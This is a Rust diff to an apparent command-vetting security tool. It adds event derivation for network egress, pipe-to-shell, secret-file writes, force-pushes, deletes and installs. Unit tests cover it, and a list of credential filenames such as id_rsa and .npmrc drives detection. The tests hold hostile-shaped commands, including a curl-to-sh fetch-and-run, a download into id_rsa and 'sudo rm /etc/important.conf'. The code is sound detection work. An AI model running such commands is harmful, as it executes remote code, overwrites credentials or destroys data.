@@ -3,11 +3,13 @@
 //! current finding density (multi-medium); `post_process_verdict` applies action
 //! overrides, approvals, paranoia, escalation, and session recording in order.
 
-use std::collections::{HashMap, HashSet};
+use std::collections::{BTreeMap, HashMap, HashSet};
 
 use serde::{Deserialize, Serialize};
 
+use crate::event_buffer::{EventKind, TypedEvent};
 use crate::session_warnings::SessionWarnings;
+use crate::tokenize::{self, ShellType};
 use crate::verdict::{Action, Evidence, Finding, RuleId, Severity, Verdict};
 
 fn default_window_60() -> u64 {
@@ -542,7 +544,397 @@ pub fn post_process_verdict(
         );
     }
 
+    // W7: record typed events for cross-event correlation. Derived from the
+    // command shape + finalized findings; the deriver only emits for clear,
+    // security-relevant signals (network egress, secret-file write, force-push,
+    // file delete, package install, pipe-to-shell), so a clean `ls`/`cd` with no
+    // findings records nothing. Best-effort, off the hot path, never alters the
+    // verdict.
+    for event in derive_typed_events(cmd, &effective) {
+        crate::session_warnings::record_typed_event(session_id, event);
+    }
+
     effective
+}
+
+/// W7: derive zero or more [`TypedEvent`]s from a finalized command + verdict,
+/// for cross-event correlation. CONSERVATIVE: emits only for clear,
+/// security-relevant shapes, so an ordinary benign command (no matching shape,
+/// no findings) produces an empty vec and records nothing. A single command can
+/// emit more than one event (e.g. `curl http://x -o .env` is both a network
+/// egress and a secret-file write).
+///
+/// Mapping wired here, all from the command string (with finding corroboration
+/// where noted). A write target is the redirection (`> path`), downloader output
+/// flag (`-o`/`--output`), or `cp`/`mv`/`tee`/`install` destination:
+/// - `curl` / `wget` / `http` / `https` / `xh` leader, OR any network-class
+///   finding (pipe-to-shell, plain-http, schemeless, data-exfil) -> `Network`
+/// - a pipe-to-shell finding -> `ShellPipe`
+/// - a write whose target is a secret file (`.env`, `id_rsa`, `.npmrc`,
+///   `.pypirc`, `credentials`, ...) -> `SecretWrite`
+/// - a write whose target is a dependency manifest (`package.json`,
+///   `Cargo.toml`, a lockfile, ...) -> `FileWrite` (with the manifest metadata
+///   flag set, so the dependency-change correlation can match it)
+/// - `git push --force` / `-f` -> `GitForcePush`
+/// - `rm` / `unlink` / `shred` with a path argument -> `FileDelete` (path in
+///   metadata)
+/// - `npm` / `pip` / `pip3` / `cargo` / `brew` / `yarn` / `pnpm` install ->
+///   `PackageInstall`
+///
+/// Deferred (NOT wired here): `ProcessExec` (too broad to be a useful
+/// correlation signal on its own), and `FileWrite` for ORDINARY (non-secret,
+/// non-manifest) files (intentionally not recorded from the command string to
+/// avoid flooding the ring; only the dependency-manifest case above emits a
+/// `FileWrite`).
+fn derive_typed_events(cmd: &str, verdict: &Verdict) -> Vec<TypedEvent> {
+    let now = chrono::Utc::now().to_rfc3339();
+    let mut events: Vec<TypedEvent> = Vec::new();
+    // EventKind is Copy + Eq (not Hash, by design), so a small Vec is the seen-set.
+    let mut seen_kinds: Vec<EventKind> = Vec::new();
+
+    let push = |events: &mut Vec<TypedEvent>,
+                seen: &mut Vec<EventKind>,
+                kind: EventKind,
+                rule_id: &str,
+                meta: BTreeMap<String, String>| {
+        // One event per kind per command keeps the ring focused.
+        if !seen.contains(&kind) {
+            seen.push(kind);
+            events.push(TypedEvent {
+                timestamp: now.clone(),
+                kind,
+                rule_id: rule_id.to_string(),
+                metadata: meta,
+            });
+        }
+    };
+
+    // --- Finding-derived signals -------------------------------------------
+    let has_pipe_to_shell = verdict.findings.iter().any(|f| {
+        matches!(
+            f.rule_id,
+            RuleId::PipeToInterpreter
+                | RuleId::CurlPipeShell
+                | RuleId::WgetPipeShell
+                | RuleId::HttpiePipeShell
+                | RuleId::XhPipeShell
+        )
+    });
+    let has_network_finding = verdict.findings.iter().any(|f| {
+        matches!(
+            f.rule_id,
+            RuleId::CurlPipeShell
+                | RuleId::WgetPipeShell
+                | RuleId::HttpiePipeShell
+                | RuleId::XhPipeShell
+                | RuleId::PlainHttpToSink
+                | RuleId::SchemelessToSink
+                | RuleId::DataExfiltration
+                | RuleId::MetadataEndpoint
+                | RuleId::PrivateNetworkAccess
+        )
+    });
+    // Hosts already extracted from finding evidence, for Network metadata.
+    let finding_hosts =
+        crate::session_warnings::extract_domains_from_evidence(&collect_evidence(verdict));
+
+    if has_pipe_to_shell {
+        push(
+            &mut events,
+            &mut seen_kinds,
+            EventKind::ShellPipe,
+            "pipe_to_interpreter",
+            BTreeMap::new(),
+        );
+    }
+
+    // --- Command-shape signals ---------------------------------------------
+    let segments = tokenize::tokenize(cmd, ShellType::Posix);
+    let mut leader_is_network = false;
+    let mut delete_path: Option<String> = None;
+    let mut is_force_push = false;
+    let mut is_package_install = false;
+    let mut secret_write_path: Option<String> = None;
+    let mut manifest_write_path: Option<String> = None;
+
+    for seg in &segments {
+        let (leader, args) = resolve_leader_and_args(seg);
+        let leader_base = command_base(&leader);
+
+        match leader_base.as_str() {
+            "curl" | "wget" | "http" | "https" | "xh" => leader_is_network = true,
+            "rm" | "unlink" | "shred" if delete_path.is_none() => {
+                delete_path = first_path_arg(&args);
+            }
+            "git" if git_is_force_push(&args) => is_force_push = true,
+            "npm" | "pnpm" | "yarn" | "pip" | "pip3" | "cargo" | "brew" | "gem" | "go" | "apt"
+            | "apt-get"
+                if args_have_install_subcommand(&args) =>
+            {
+                is_package_install = true;
+            }
+            _ => {}
+        }
+
+        // A write target: a redirection (`> path`), a downloader output flag
+        // (`curl -o path`), or a `cp`/`mv`/`tee`/`install` destination. Classify
+        // the written path: a secret file is a SecretWrite, a dependency manifest
+        // is a (flagged) FileWrite. An ordinary file is intentionally ignored.
+        if let Some(path) = write_target(seg, &leader_base, &args) {
+            if is_secret_path(&path) {
+                if secret_write_path.is_none() {
+                    secret_write_path = Some(path);
+                }
+            } else if path_is_manifest(&path) && manifest_write_path.is_none() {
+                manifest_write_path = Some(path);
+            }
+        }
+    }
+
+    if has_network_finding || leader_is_network {
+        let mut meta = BTreeMap::new();
+        if let Some(host) = finding_hosts.first() {
+            meta.insert("host".to_string(), host.clone());
+        }
+        push(
+            &mut events,
+            &mut seen_kinds,
+            EventKind::Network,
+            "network_egress",
+            meta,
+        );
+    }
+
+    if let Some(path) = secret_write_path {
+        let mut meta = BTreeMap::new();
+        meta.insert("path".to_string(), path);
+        push(
+            &mut events,
+            &mut seen_kinds,
+            EventKind::SecretWrite,
+            "secret_file_write",
+            meta,
+        );
+    }
+
+    if let Some(path) = manifest_write_path {
+        let mut meta = BTreeMap::new();
+        meta.insert("path".to_string(), path);
+        meta.insert(
+            crate::event_buffer::MANIFEST_FLAG_KEY.to_string(),
+            "true".to_string(),
+        );
+        push(
+            &mut events,
+            &mut seen_kinds,
+            EventKind::FileWrite,
+            "dependency_manifest_write",
+            meta,
+        );
+    }
+
+    if is_force_push {
+        push(
+            &mut events,
+            &mut seen_kinds,
+            EventKind::GitForcePush,
+            "git_force_push",
+            BTreeMap::new(),
+        );
+    }
+
+    if let Some(path) = delete_path {
+        let mut meta = BTreeMap::new();
+        meta.insert("path".to_string(), path);
+        push(
+            &mut events,
+            &mut seen_kinds,
+            EventKind::FileDelete,
+            "file_delete",
+            meta,
+        );
+    }
+
+    if is_package_install {
+        push(
+            &mut events,
+            &mut seen_kinds,
+            EventKind::PackageInstall,
+            "package_install",
+            BTreeMap::new(),
+        );
+    }
+
+    events
+}
+
+/// Flatten all evidence across a verdict's findings (so host extraction can run).
+fn collect_evidence(verdict: &Verdict) -> Vec<Evidence> {
+    verdict
+        .findings
+        .iter()
+        .flat_map(|f| f.evidence.iter().cloned())
+        .collect()
+}
+
+/// Resolve a segment's real leader + args, peeling sudo/env/command wrappers via
+/// [`crate::extract::resolve_wrapped_command`], falling back to the literal
+/// leader/args when the wrapper cannot be unambiguously resolved.
+fn resolve_leader_and_args(seg: &tokenize::Segment) -> (String, Vec<String>) {
+    if let Some((name, args)) = crate::extract::resolve_wrapped_command(seg) {
+        return (name, args);
+    }
+    let leader = seg.command.clone().unwrap_or_default();
+    (leader, seg.args.clone())
+}
+
+/// Final path component of a command name, stripped of a directory prefix
+/// (`/usr/bin/curl` -> `curl`).
+fn command_base(name: &str) -> String {
+    name.rsplit(['/', '\\'])
+        .next()
+        .unwrap_or(name)
+        .to_ascii_lowercase()
+}
+
+/// The first non-flag argument, treated as a path. Conservative: returns the
+/// first token that does not start with `-`.
+fn first_path_arg(args: &[String]) -> Option<String> {
+    args.iter().find(|a| !a.starts_with('-')).cloned()
+}
+
+/// True if `args` (the args AFTER `git`) describe a force-push: a `push`
+/// subcommand together with `--force`, `-f`, or `--force-with-lease`.
+fn git_is_force_push(args: &[String]) -> bool {
+    let mut saw_push = false;
+    let mut saw_force = false;
+    for a in args {
+        if a == "push" {
+            saw_push = true;
+        }
+        if a == "--force"
+            || a == "-f"
+            || a == "--force-with-lease"
+            || a.starts_with("--force-with-lease=")
+        {
+            saw_force = true;
+        }
+    }
+    saw_push && saw_force
+}
+
+/// True if `args` contain a package-install subcommand (`install`, `i`, `add`,
+/// `get`). Conservative: the leader was already matched to a package manager.
+fn args_have_install_subcommand(args: &[String]) -> bool {
+    args.iter()
+        .any(|a| matches!(a.as_str(), "install" | "i" | "add" | "get"))
+}
+
+/// Secret-bearing filenames a write/download into which is a `SecretWrite`.
+fn is_secret_file(basename: &str) -> bool {
+    let lower = basename.to_ascii_lowercase();
+    const EXACT: &[&str] = &[
+        ".env",
+        "id_rsa",
+        "id_ed25519",
+        "id_ecdsa",
+        "id_dsa",
+        ".npmrc",
+        ".pypirc",
+        ".netrc",
+        "credentials",
+        ".pgpass",
+        ".git-credentials",
+    ];
+    if EXACT.contains(&lower.as_str()) {
+        return true;
+    }
+    // `.env.local`, `.env.production`, etc.
+    lower.starts_with(".env.")
+}
+
+/// Detect a write target in a segment: a redirection (`> path` / `>> path`), a
+/// downloader output flag (`curl -o path`, `wget -O path`, `--output=path`), or
+/// a `cp`/`mv`/`tee`/`install` destination. Returns the written path WITHOUT
+/// classifying it; the caller decides whether it is a secret file, a dependency
+/// manifest, or ordinary (ignored). Conservative best-effort token scan.
+fn write_target(seg: &tokenize::Segment, leader_base: &str, args: &[String]) -> Option<String> {
+    // 1) Shell redirection target anywhere in the raw segment: `> ~/.npmrc`.
+    if let Some(path) = redirection_target(&seg.raw) {
+        return Some(path);
+    }
+
+    // 2) Downloader output flag: `curl -o .env`, `wget -O id_rsa`.
+    if matches!(leader_base, "curl" | "wget" | "http" | "xh") {
+        let mut want_value = false;
+        for a in args {
+            if want_value {
+                return Some(a.clone());
+            }
+            match a.as_str() {
+                "-o" | "-O" | "--output" | "--output-document" => want_value = true,
+                _ => {
+                    if let Some(rest) = a.strip_prefix("--output=") {
+                        if !rest.is_empty() {
+                            return Some(rest.to_string());
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // 3) Copy/move/tee/install destination. For cp/mv the destination is the
+    // LAST non-flag arg; for tee it is the first non-flag arg.
+    match leader_base {
+        "cp" | "mv" | "install" => {
+            if let Some(dest) = args.iter().rev().find(|a| !a.starts_with('-')) {
+                return Some(dest.clone());
+            }
+        }
+        "tee" => {
+            if let Some(p) = args.iter().find(|a| !a.starts_with('-')) {
+                return Some(p.clone());
+            }
+        }
+        _ => {}
+    }
+
+    None
+}
+
+/// True if `path`'s basename is a secret file.
+fn is_secret_path(path: &str) -> bool {
+    let base = path.rsplit(['/', '\\']).next().unwrap_or(path);
+    is_secret_file(base)
+}
+
+/// True if `path`'s basename is a dependency manifest / lockfile.
+fn path_is_manifest(path: &str) -> bool {
+    let base = path.rsplit(['/', '\\']).next().unwrap_or(path);
+    crate::event_buffer::is_dependency_manifest(base)
+}
+
+/// Find a `> path` / `>> path` redirection target in raw segment text and return
+/// the path (unclassified). Tokenizes on whitespace and looks for a `>`/`>>`
+/// token (or a `>`-prefixed token) followed by a path.
+fn redirection_target(raw: &str) -> Option<String> {
+    let toks: Vec<&str> = raw.split_whitespace().collect();
+    for (i, tok) in toks.iter().enumerate() {
+        // `> path` or `>> path` (separated).
+        if (*tok == ">" || *tok == ">>") || tok.ends_with('>') && tok.chars().all(|c| c == '>') {
+            if let Some(next) = toks.get(i + 1) {
+                return Some((*next).to_string());
+            }
+        }
+        // `>path` / `>>path` (attached).
+        if let Some(rest) = tok.strip_prefix(">>").or_else(|| tok.strip_prefix('>')) {
+            if !rest.is_empty() {
+                return Some(rest.to_string());
+            }
+        }
+    }
+    None
 }
 
 #[cfg(test)]
@@ -578,6 +970,7 @@ mod tests {
             escalation_events: std::collections::VecDeque::new(),
             hidden_events: std::collections::VecDeque::new(),
             cooldowns: std::collections::BTreeMap::new(),
+            typed_events: std::collections::VecDeque::new(),
         }
     }
 
@@ -1431,6 +1824,155 @@ mod tests {
             result.approval_fallback.is_none(),
             "denied verdict must NOT emit approval_fallback: {:?}",
             result.approval_fallback,
+        );
+    }
+
+    // --- W7: derive_typed_events -------------------------------------------
+
+    fn kinds(events: &[TypedEvent]) -> Vec<EventKind> {
+        events.iter().map(|e| e.kind).collect()
+    }
+
+    #[test]
+    fn derive_benign_command_records_nothing() {
+        // A clean Allow with no findings and no security-relevant shape: empty.
+        let v = raw_verdict_with(Action::Allow, vec![], None);
+        assert!(derive_typed_events("ls -la /tmp", &v).is_empty());
+        assert!(derive_typed_events("cd /home/user && echo hi", &v).is_empty());
+    }
+
+    #[test]
+    fn derive_network_from_curl_leader() {
+        let v = raw_verdict_with(Action::Allow, vec![], None);
+        let events = derive_typed_events("curl https://example.com/x", &v);
+        assert!(kinds(&events).contains(&EventKind::Network));
+    }
+
+    #[test]
+    fn derive_network_from_finding() {
+        // Even without a curl/wget leader, a network-class finding records Network.
+        let v = raw_verdict_with(
+            Action::Warn,
+            vec![make_finding(RuleId::DataExfiltration, Severity::High)],
+            None,
+        );
+        let events = derive_typed_events("./tool --send", &v);
+        assert!(kinds(&events).contains(&EventKind::Network));
+    }
+
+    #[test]
+    fn derive_shell_pipe_from_finding() {
+        let v = raw_verdict_with(
+            Action::Warn,
+            vec![make_finding(RuleId::CurlPipeShell, Severity::High)],
+            None,
+        );
+        let events = derive_typed_events("curl https://x.example/i.sh | sh", &v);
+        let ks = kinds(&events);
+        assert!(ks.contains(&EventKind::ShellPipe));
+        // A curl leader also marks it a Network egress.
+        assert!(ks.contains(&EventKind::Network));
+    }
+
+    #[test]
+    fn derive_secret_write_from_redirection() {
+        let v = raw_verdict_with(Action::Allow, vec![], None);
+        let events = derive_typed_events("printf 'TOKEN=x' > ~/.npmrc", &v);
+        let secret = events
+            .iter()
+            .find(|e| e.kind == EventKind::SecretWrite)
+            .expect("secret write event");
+        assert_eq!(
+            secret.metadata.get("path").map(String::as_str),
+            Some("~/.npmrc")
+        );
+    }
+
+    #[test]
+    fn derive_secret_write_from_curl_output_flag() {
+        let v = raw_verdict_with(Action::Allow, vec![], None);
+        let events = derive_typed_events("curl https://x.example/k -o id_rsa", &v);
+        let ks = kinds(&events);
+        assert!(ks.contains(&EventKind::SecretWrite));
+        assert!(ks.contains(&EventKind::Network));
+    }
+
+    #[test]
+    fn derive_non_secret_write_records_nothing() {
+        // Writing an ordinary file is NOT recorded from the command string.
+        let v = raw_verdict_with(Action::Allow, vec![], None);
+        assert!(derive_typed_events("echo hi > notes.txt", &v).is_empty());
+    }
+
+    #[test]
+    fn derive_dependency_manifest_write_is_flagged_filewrite() {
+        // A write whose target is a dependency manifest records a FileWrite with
+        // the manifest flag, so the dependency-change correlation can match it.
+        let v = raw_verdict_with(Action::Allow, vec![], None);
+        let events = derive_typed_events("cp /tmp/new package.json", &v);
+        let fw = events
+            .iter()
+            .find(|e| e.kind == EventKind::FileWrite)
+            .expect("file write event");
+        assert_eq!(
+            fw.metadata
+                .get(crate::event_buffer::MANIFEST_FLAG_KEY)
+                .map(String::as_str),
+            Some("true")
+        );
+        assert_eq!(
+            fw.metadata.get("path").map(String::as_str),
+            Some("package.json")
+        );
+    }
+
+    #[test]
+    fn derive_git_force_push() {
+        let v = raw_verdict_with(Action::Allow, vec![], None);
+        assert!(
+            kinds(&derive_typed_events("git push --force origin main", &v))
+                .contains(&EventKind::GitForcePush)
+        );
+        assert!(kinds(&derive_typed_events("git push -f", &v)).contains(&EventKind::GitForcePush));
+        // A plain push is NOT a force-push.
+        assert!(!kinds(&derive_typed_events("git push origin main", &v))
+            .contains(&EventKind::GitForcePush));
+    }
+
+    #[test]
+    fn derive_file_delete_with_path() {
+        let v = raw_verdict_with(Action::Allow, vec![], None);
+        let events = derive_typed_events("rm -rf src/old.rs", &v);
+        let del = events
+            .iter()
+            .find(|e| e.kind == EventKind::FileDelete)
+            .expect("file delete event");
+        assert_eq!(
+            del.metadata.get("path").map(String::as_str),
+            Some("src/old.rs")
+        );
+    }
+
+    #[test]
+    fn derive_file_delete_through_sudo_wrapper() {
+        // resolve_wrapped_command peels `sudo`, so the leader is still `rm`.
+        let v = raw_verdict_with(Action::Allow, vec![], None);
+        assert!(
+            kinds(&derive_typed_events("sudo rm /etc/important.conf", &v))
+                .contains(&EventKind::FileDelete)
+        );
+    }
+
+    #[test]
+    fn derive_package_install() {
+        let v = raw_verdict_with(Action::Allow, vec![], None);
+        assert!(kinds(&derive_typed_events("npm install left-pad", &v))
+            .contains(&EventKind::PackageInstall));
+        assert!(kinds(&derive_typed_events("pip3 install requests", &v))
+            .contains(&EventKind::PackageInstall));
+        // `npm run build` is not an install.
+        assert!(
+            !kinds(&derive_typed_events("npm run build", &v)).contains(&EventKind::PackageInstall)
         );
     }
 }
